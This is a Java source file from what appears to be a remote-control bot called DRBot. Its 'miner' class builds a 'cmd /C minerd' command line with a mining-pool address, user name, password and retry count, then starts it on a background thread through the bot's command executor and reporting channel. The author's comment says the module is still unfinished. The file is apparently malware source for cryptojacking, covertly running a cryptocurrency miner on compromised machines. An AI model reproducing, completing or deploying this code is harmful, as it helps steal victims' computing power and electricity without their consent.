package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;

/**
 *
 * @author MerNat
 */

public class miner {
    public static boolean insMiner;
    private final String loc;
    private ProcessBuilder pB;
    private Process pS;
    public static Exc ex;
    private final Thread Exc;
    private final String address,user,pass;
    private final int codeMiner,retr;
    
    /*
        i'm left only with getting the needed info and run the miner.
    */
    
    miner(String loc,PrintWriter writer,int codeMiner,String address,String user,String pass,int retr,SecureLine secureLine){
        this.address = address;
        this.user = user;
        this.pass = pass;
        this.codeMiner = codeMiner;
        this.retr = retr;
        this.loc = loc;
        ex = new Exc(new String[]{">exc",loc,genCode()},writer,secureLine);
        Exc = new Thread(ex);
        runMiner();
    }
    
    public static boolean chkMiner(){
        return insMiner;
    }
    private void runMiner(){
        Exc.start();
    }
    private String genCode(){
        if(codeMiner == 1){
            return "cmd_/C_minerd_-o_" + address + "_-u_" +
                    user + "_-p_" + pass + "_-R_" + retr;
        }
        else
            return "null";
    }
}
